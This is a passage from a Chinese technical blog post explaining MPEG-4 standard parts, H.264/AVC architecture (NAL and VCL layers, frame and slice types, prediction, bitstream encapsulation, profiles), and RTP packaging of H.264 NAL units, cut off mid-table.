&lt;p&gt;第十部分（ISO/IEC 14496-10）：高级视频编码或称高级视频编码（Advanced Video Coding，缩写为AVC）：定义一个视频编解码器（codec）。AVC和XviD都属于MPEG-4编码，但由于AVC属于MPEG-4 Part 10，在技术特性上比属于MPEG-4 Part2的XviD要先进。另外，它和ITU-T H.264标准是一致的，故又称为H.264。&lt;/p&gt;
&lt;p&gt;第十二部分（ISO/IEC 14496-12）：基于ISO的媒体文件格式：定义一个存储媒体内容的文件格式。&lt;/p&gt;
&lt;p&gt;第十三部分（ISO/IEC 14496-13）：知识产权管理和保护（IPMP for Intellectual Property Management and Protection）拓展。&lt;/p&gt;
&lt;p&gt;第十四部分（ISO/IEC 14496-14）：MPEG-4（即MP4）文件格式：定义基于第十二部分的用于存储MPEG-4内容的视频文档格式。&lt;/p&gt;
&lt;p&gt;第十五部分（ISO/IEC 14496-15）：AVC文件格式：定义基于第十二部分的用于存储第十部分的视频内容的文件格式。&lt;/p&gt;
&lt;p&gt;第十六部分（ISO/IEC 14496-16）：动画框架扩展（AFX : Animation Framework eXtension）。&lt;/p&gt;
&lt;p&gt;第十七部分（ISO/IEC 14496-17）：同步文本字幕格式。&lt;/p&gt;
&lt;p&gt;第十八部分（ISO/IEC 14496-18）：字体压缩和流式传输（针对开放字体格式Open Font Format）。&lt;/p&gt;
&lt;p&gt;第十九部分（ISO/IEC 14496-19）：合成材质流（Synthesized Texture Stream）。&lt;/p&gt;
&lt;p&gt;第二十部分（ISO/IEC 14496-20）：简单场景表示（LASeR for Lightweight Scene Representation。&lt;/p&gt;
&lt;p&gt;第二十一部分（ISO/IEC 14496-21）：用于描绘（Rendering）的MPEG-J拓展。&lt;/p&gt;
&lt;p&gt;第二十二部分（ISO/IEC 14496-22）：开放字体格式（Open Font Format）。&lt;/p&gt;
&lt;p&gt;第二十三部分（ISO/IEC 14496-23）：符号化音乐表示（Symbolic Music Representation）。&lt;/p&gt;
&lt;p&gt;第二十四部分（ISO/IEC 14496-24）：音频与系统交互作用（Audio and systems interaction）。&lt;/p&gt;
&lt;p&gt;第二十五部分（ISO/IEC 14496-25）：3D图形压缩模型（3D Graphics Compression Model）。&lt;/p&gt;
&lt;p&gt;第二十六部分（ISO/IEC 14496-26）：音频一致性检查：定义测试音频数据与ISO/IEC 14496-3是否一致的方法（Audio conformance）。&lt;/p&gt;
&lt;p&gt;第二十七部分（ISO/IEC 14496-27）：3D图形一致性检查：定义测试3D图形数据与ISO/IEC 14496-11:2005, ISO/IEC 14496-16:2006, ISO/IEC 14&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;几个重点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;音视频编码：第二部分（ISO/IEC 14496-2）/第三部分（ISO/IEC 14496-3）（MPEG4 编码）、第十部分（ISO/IEC 14496-10）(H.264)&lt;/li&gt;
&lt;li&gt;网络传输：第八部分（ISO/IEC 14496-8）&lt;/li&gt;
&lt;li&gt;MP4文件格式：第十四部分（ISO/IEC 14496-14）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;141mp4-vs-mpeg-4&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#141mp4-vs-mpeg-4&#34;&gt;
        ##
    &lt;/a&gt;
    1.4.1.MP4 vs MPEG-4
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;MP4或称MPEG-4第14部分（英语：MPEG-4 Part 14）是一种标准的数字多媒体容器格式。MPEG-4第14部分的扩展名为.mp4，以存储数字音频及数字视频为主，但也可以存储字幕和静止图像。因其可容纳支持比特流的视频流（如高级视频编码），为流媒体。&lt;/p&gt;
&lt;p&gt;MPEG-4 是一系列用来定义音频、视频的标准集&lt;/p&gt;
&lt;h2 id=&#34;15视频编码标准的演变&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#15%e8%a7%86%e9%a2%91%e7%bc%96%e7%a0%81%e6%a0%87%e5%87%86%e7%9a%84%e6%bc%94%e5%8f%98&#34;&gt;
        #
    &lt;/a&gt;
    1.5.视频编码标准的演变
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/evolution-of-video-compression-standards.png&#34; alt=&#34;Evolution&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;H.261: 视频电话&lt;/li&gt;
&lt;li&gt;MPEG-1: VCD&lt;/li&gt;
&lt;li&gt;H.262: 数字电视 / DVD&lt;/li&gt;
&lt;li&gt;H.263/H.263+/H.263++：通讯类应用，如视频会议，支持多种网络（PSTN, mobile, LAN/Internet），对丢包/出错场景的兼容性更高&lt;/li&gt;
&lt;li&gt;MPEG-4：基于目标编码，形状编码&lt;/li&gt;
&lt;li&gt;H.264 / AVC Coding：多种使用场景，有线/无线广播、DVD/蓝光存储、视频会议、流式多媒体、多媒体消息（MMS）。因此支持各种读取方式支持顺序/随机，高/低比特率，高/低网络延迟，高/低丢包等情景。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2h264第十部分isoiec-14496-10&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2h264%e7%ac%ac%e5%8d%81%e9%83%a8%e5%88%86isoiec-14496-10&#34;&gt;
        ##
    &lt;/a&gt;
    2.H.264.第十部分（ISO/IEC 14496-10）
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;21架构&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#21%e6%9e%b6%e6%9e%84&#34;&gt;
        #
    &lt;/a&gt;
    2.1.架构
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/structure-of-h264.png&#34; alt=&#34;structure&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分层设计:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Network Abstraction Layer (NAL)：视频和 metadata 格式化进行各种网络适配&lt;/li&gt;
&lt;li&gt;Video Coding Layer (VCL)：视频编码层&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;主要步骤：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;压缩：预测（帧内预测/帧间预测），DCT转换和量化，比特流编码，结果是编码的 Macroblock&lt;/li&gt;
&lt;li&gt;切分数据：分片，切分&lt;/li&gt;
&lt;li&gt;封装：包装 NAL&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;22-nal&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#22-nal&#34;&gt;
        #
    &lt;/a&gt;
    2.2. NAL
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;主要目标定义如何把视频数据在不同的网络上进行传输&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RTP/IP：互联网广播&lt;/li&gt;
&lt;li&gt;MPEG-2：广播服务流&lt;/li&gt;
&lt;li&gt;ISO 文件：存储应用（光盘）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NALU 按内容进行分类：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VCL unit：视频图像
&lt;ul&gt;
&lt;li&gt;头信息块（A类）：包括宏块类型，量化参数，运动矢量&lt;/li&gt;
&lt;li&gt;帧内编码信息块（B类）：包含帧内编码宏块类型，帧内编码系数&lt;/li&gt;
&lt;li&gt;帧间编码信息块（C类）：包含帧间编码宏块类型，帧间编码系数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Non-VCL unit：metadata 等信息
&lt;ul&gt;
&lt;li&gt;Parameter sets：被 VCL NAL units 共享的数据头信息
&lt;ul&gt;
&lt;li&gt;picture parameter set (PPS): 图像参数集，PPS对如熵编码类型、有效参考图像的数目、初始化量化参数、去方块滤波系数等解码参数进行标志记录。一个 VCL 包含一个自己的 picture parameter set 指向对应 PPS Non-VCL unit 的指针。&lt;/li&gt;
&lt;li&gt;sequence parameter set (SPS): 序列参数集，SPS对如标识符、帧数以及参考帧数目、解码图像尺寸和帧场模式等解码参数进行标识记录。每个 picture parameter set 指向 sequence parameter set&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Supplemental Enhancement Info (SEI)：用于提高播放质量（rate-distortion等），非必需的，扩展性强（应用程序可扩展）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/PPS-SPS.png&#34; alt=&#34;SPS-PPS&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NALU 传输分类：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于流（stream-oriented）：需要使用 Start Code prefix (00 00 00 01 或 00 00 01)&lt;/li&gt;
&lt;li&gt;基于包（packet-oriented）：不需要使用 Start Code prefix&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;编码：&lt;/strong&gt;
H.264 NALU 单元常由[Start Code] [NALU Header] [NALU Payload] 三部分组成&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Start Code: 表示 NALU 开始，必须是 00 00 00 01 或 00 00 01&lt;/li&gt;
&lt;li&gt;NALU Header：1 个字节&lt;/li&gt;
&lt;li&gt;NALU Payload：内容&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;访问（Access Units）：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一组可以解码成图像的 NALU 被称为 Access Units&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/access-units.png&#34; alt=&#34;access units&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Delimiter: 定位&lt;/li&gt;
&lt;li&gt;SEI：时间和其他信息&lt;/li&gt;
&lt;li&gt;Primary coded picture: VCL&lt;/li&gt;
&lt;li&gt;Redundant coded picture：主码解码错误后进行错误修复&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;23-vcl&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#23-vcl&#34;&gt;
        #
    &lt;/a&gt;
    2.3. VCL
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;231图像表示方法概念&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#231%e5%9b%be%e5%83%8f%e8%a1%a8%e7%a4%ba%e6%96%b9%e6%b3%95%e6%a6%82%e5%bf%b5&#34;&gt;
        ##
    &lt;/a&gt;
    2.3.1.图像表示方法概念
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/VCL-hierarchy.png&#34; alt=&#34;VCL hierarchy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;宏块 Macroblock(MB):&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;亮度宏块（luma）：大小 16x16，1个&lt;/li&gt;
&lt;li&gt;色差宏块（chroma）：大小 8x8，2个，与 primary colors 的色差分量 Cb, Cr。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;片（slice）：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;slice是 一组 MB 构成的集合，一个 slice 可以不需要别的 slice 参与进行独立解码，可以分为以下几类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I-slice: 帧内预测 (I-MB)&lt;/li&gt;
&lt;li&gt;P-slice: 帧间预测 (I- and P-MBs)&lt;/li&gt;
&lt;li&gt;B-slice: 双向帧间预测 (I- and B-MBs)&lt;/li&gt;
&lt;li&gt;SP-slice: 在不同码流间切换&lt;/li&gt;
&lt;li&gt;SI-slice: 与 SP-slice 一起在不同码流间切换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;灵活的宏块顺序 (Flexible Macroblock Order - FMO)：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/flexible-macroblock-ordering.png&#34; alt=&#34;FMO&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 slice 内部 macroblock 按照栅格顺序排列&lt;/li&gt;
&lt;li&gt;slice group：包含一个或多个 slice&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;图像（Picture）:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一个图像通常对应一帧(Frame)或两场(Field)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;帧（Frame）:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一个帧包含 1 个亮度分量和 2 个色差分量&lt;/p&gt;
&lt;p&gt;分类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I帧(Intra coded frame/关键帧)
&lt;ul&gt;
&lt;li&gt;普通 I 帧：所有 MB 采用帧内预测方式，仅用 I 帧就可以解码出完整图像
&lt;ul&gt;
&lt;li&gt;作为P帧/B帧的参考帧&lt;/li&gt;
&lt;li&gt;可以作为快进/快退的参考点&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IDR 帧：立即刷新图像缓冲区，从 IDR 可以重新开始一个序列（Sequence），IDR 之后的 P帧/B帧都不能参考之前的帧
&lt;ul&gt;
&lt;li&gt;主要用于随机播放&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;P帧：前向预测帧间编码帧，参考前面靠近的 I 帧和 P 帧
&lt;ul&gt;
&lt;li&gt;P 帧可以作为后续 P 帧的参考帧（如果中间出现错误会传递扩大）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;B帧：双向预测帧间编码帧，参考前面靠近的 I 帧和 P 帧和后面的 P 帧
&lt;ul&gt;
&lt;li&gt;在更早的标准中（如 MPEG-2）不作为参考帧&lt;/li&gt;
&lt;li&gt;在 H.264 中可以作为参考帧&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SI帧：用于不同编码流之间的切换&lt;/li&gt;
&lt;li&gt;SP帧：用于不同编码流之间的切换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;“帧”与“片”与“宏块”&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;帧/片类型&lt;/th&gt;
&lt;th&gt;宏块&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;I frames/slices (Intra)&lt;/td&gt;
&lt;td&gt;I宏块&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;P frames/slices (Predicted)&lt;/td&gt;
&lt;td&gt;I宏块、P宏块&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;B frames/slices (Bi-Predicted)&lt;/td&gt;
&lt;td&gt;I宏块、B宏块&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SI-frames/slices (switching I)&lt;/td&gt;
&lt;td&gt;SI宏块（一种特殊的帧内编码宏块），用于不同编码流之间的切换&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SP-frames/slices (switching P)&lt;/td&gt;
&lt;td&gt;I宏块、P宏块，用于不同编码流之间的切换&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;场/帧场（Field）:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;帧内交替行（奇偶行）的集合，一个帧由顶场(Top Field)/底场(Bottom Field)组成，每个场可以在不同的时间拍摄（Interlaced）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; Top field					Top field
 			Bottom field					Bottom field
^                     ^
|       frame         |

          ^                        ^
 			|         frame          |
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Field 编码成 Frame 有几种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;frame mode: 只用单个 frame&lt;/li&gt;
&lt;li&gt;field mode: 2 个 field 组成一个 frame&lt;/li&gt;
&lt;li&gt;mixed mode (adaptive): 自适应的决定使用 frame mode 或 field mode&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;自适应 (adaptive mode) 可以分两种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PAFF (Picture-Adaptive frame/field)
&lt;ul&gt;
&lt;li&gt;在 frame 级别进行判定使用 frame / field mode&lt;/li&gt;
&lt;li&gt;比使用 frame mode 提高 16-20% 压缩率&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MBAFF (Macroblock-adaptive frame/field)
&lt;ul&gt;
&lt;li&gt;在 MB 级别进行判定使用 frame / field mode&lt;/li&gt;
&lt;li&gt;比 PAFF 进一步提高 14-16% 压缩率&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;**题外话：**过去的阴极射线电视机在帧率接近电影的帧率时图像会过快消失，所以采用隔行扫描形式组成 1 帧，同时可以降低数据带宽。&lt;/p&gt;
&lt;h3 id=&#34;232帧内预测-intra-frame-prediction&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#232%e5%b8%a7%e5%86%85%e9%a2%84%e6%b5%8b-intra-frame-prediction&#34;&gt;
        ##
    &lt;/a&gt;
    2.3.2.帧内预测 (Intra-frame Prediction)
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;使用一个 MB 左边及上边的 MB 进行预测。&lt;/p&gt;
&lt;p&gt;预测类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Intra_4x4: detailed luma blocks&lt;/li&gt;
&lt;li&gt;Intra_16x16: smoothed luma blocks&lt;/li&gt;
&lt;li&gt;Chroma_8x8: 色差比较平滑&lt;/li&gt;
&lt;li&gt;I_PCM: 忽略 prediction/transform，适用于不规则的图像、或者无损的图像、或者需要进行确定性 bit-rate 的场景&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2321intra_4x4&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2321intra_4x4&#34;&gt;
        ###
    &lt;/a&gt;
    2.3.2.1.Intra_4x4
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/intra-4x4.png&#34; alt=&#34;Intra_4x4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;预测模式：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1 个 DC 模式&lt;/li&gt;
&lt;li&gt;8 个方向模式&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2322intra_16x16&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2322intra_16x16&#34;&gt;
        ###
    &lt;/a&gt;
    2.3.2.2.Intra_16x16
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/intra-16x16.png&#34; alt=&#34;Intra_16x16&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;预测模式：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Vertical&lt;/li&gt;
&lt;li&gt;Horizontal&lt;/li&gt;
&lt;li&gt;DC&lt;/li&gt;
&lt;li&gt;Planar (Diagonal)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;233inter-prediction-in-p-slices&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#233inter-prediction-in-p-slices&#34;&gt;
        ##
    &lt;/a&gt;
    2.3.3.Inter-Prediction in P slices
&lt;/div&gt;
&lt;/h3&gt;
&lt;h4 id=&#34;2331切分-mb&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2331%e5%88%87%e5%88%86-mb&#34;&gt;
        ###
    &lt;/a&gt;
    2.3.3.1.切分 MB
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/inter-prediction-P-slice.png&#34; alt=&#34;segmentation&#34;&gt;&lt;/p&gt;
&lt;p&gt;按照亮度和色差切分&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/segmentation-example.png&#34; alt=&#34;segmentation example&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;234multiframe-inter-prediction-in-b-slices&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#234multiframe-inter-prediction-in-b-slices&#34;&gt;
        ##
    &lt;/a&gt;
    2.3.4.Multiframe Inter-Prediction in B slices
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/inter-prediction-B-slice.png&#34; alt=&#34;B slices&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;24码流结构&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#24%e7%a0%81%e6%b5%81%e7%bb%93%e6%9e%84&#34;&gt;
        #
    &lt;/a&gt;
    2.4.码流结构
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/nal-structure.png&#34; alt=&#34;structure&#34;&gt;&lt;/p&gt;
&lt;p&gt;经过 VCL 编码后生成的 NALU 原始数据会被分包，因为 NALU 的 Start Code 是 00 00 00 01 或 00 00 01，因此在 NALU 数据中也可能存在冲突，解决办法是引入 EBSP&lt;/p&gt;
&lt;p&gt;几个概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SODB：String of Data Bits，原始数据比特流，是最原始的编码压缩后的数据&lt;/li&gt;
&lt;li&gt;RBSP：Raw Byte Sequence Payload，原始字节序列载荷，对 SODB 进行 8 位补齐
&lt;ul&gt;
&lt;li&gt;RBSP = SODB + RBSP Trailing Bits&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;EBSP：Encapsulated Byte Sequence Payload，扩展字节序列载荷，在 RBSP 中引入防竞争字节（0x03），在 RBSP 中如果出现了连续两个 00 字节，就在后面添加一个防竞争字节（0x03）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/payload-encoding.png&#34; alt=&#34;payload encoding&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;25profiles-and-applications&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#25profiles-and-applications&#34;&gt;
        #
    &lt;/a&gt;
    2.5.Profiles and Applications
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/profiles-applications.png&#34; alt=&#34;profiles &amp;amp; applications&#34;&gt;&lt;/p&gt;
&lt;p&gt;主要目的是定义编码工具和算法&lt;/p&gt;
&lt;p&gt;3 个 Profile:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Baseline: 主要用于视频会议&lt;/li&gt;
&lt;li&gt;Main: 广播、媒体存储、数字影院&lt;/li&gt;
&lt;li&gt;Extended: IP 网络流媒体&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3网络传输-第八部分isoiec-14496-8&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3%e7%bd%91%e7%bb%9c%e4%bc%a0%e8%be%93-%e7%ac%ac%e5%85%ab%e9%83%a8%e5%88%86isoiec-14496-8&#34;&gt;
        ##
    &lt;/a&gt;
    3.网络传输: 第八部分（ISO/IEC 14496-8）
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;这个标准定义了以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 IP 网络上传输 ISO/IEC 14496 内容的框架&lt;/li&gt;
&lt;li&gt;在 RTP 中分片/组装负载的指导方法&lt;/li&gt;
&lt;li&gt;使用 SDP (Session description protocol) 传输 ISO/IEC 14496-1 内容&lt;/li&gt;
&lt;li&gt;ISO/IEC14496 相关的 MIME type&lt;/li&gt;
&lt;li&gt;RTP 安全和多播&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;31-rtp&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#31-rtp&#34;&gt;
        #
    &lt;/a&gt;
    3.1. RTP
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;RTP 负载分片/组装规则&lt;/p&gt;
&lt;h3 id=&#34;311-rtp-传输-h264&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#311-rtp-%e4%bc%a0%e8%be%93-h264&#34;&gt;
        ##
    &lt;/a&gt;
    3.1.1. RTP 传输 H.264
&lt;/div&gt;
&lt;/h3&gt;
&lt;h4 id=&#34;h264-nalu&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#h264-nalu&#34;&gt;
        ###
    &lt;/a&gt;
    H.264 NALU
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;H.264 NALU 单元常由[Start Code] [NALU Header] [NALU Payload] 三部分组成&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Start Code: 表示 NALU 开始，必须是 00 00 00 01 或 00 00 01&lt;/li&gt;
&lt;li&gt;NALU Header：1 个字节&lt;/li&gt;
&lt;li&gt;NALU Payload：内容&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;nalu-header--payload&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#nalu-header--payload&#34;&gt;
        ####
    &lt;/a&gt;
    NALU (Header + Payload)
&lt;/div&gt;
&lt;/h5&gt;
&lt;p&gt;一个 NALU 的封装形式如下，包含了 NALU Header 及 NALU Payload&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;   0                   1                   2                   3
   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  |F|NRI|  type   |                                               |
  +-+-+-+-+-+-+-+-+                                               |
  |                                                               |
  |               Bytes 2..n of a Single NAL unit                 |
  |                                                               |
  |                               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  |                               :...OPTIONAL RTP padding        |
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;nalu-header&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#nalu-header&#34;&gt;
        ####
    &lt;/a&gt;
    NALU Header：
&lt;/div&gt;
&lt;/h5&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+---------------+
|0|1|2|3|4|5|6|7|
+-+-+-+-+-+-+-+-+
|F|NRI|  Type   |
+---------------+
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;F: 1 bit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;forbidden_zero_bit，h264语法规定值为0。rtp封包中，当检测到值为1时，则表示该nalu中已出现错误。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;NRI: 2 bits
nal_ref_idc, 参考级别，当值为00时，表示后面的负载可以丢弃，并不会影响正常解码，当大于00时后面的该包丢弃会影响解码，不可丢弃。rtp封包中，该值也表示该数据包的重要性，11为重要性最高。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Type: 5 bits&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;nal_unit_type，nalu的类型，h264文档中定义为&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;nal_unit_type&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;未定义&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;非IDR图像中不采用数据划分的片段&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;非IDR图像中A类数据划分片段&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;非IDR图像中B类数据划分片段&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;非IDR图像中C类数据划分片段&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;IDR图像的片段&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
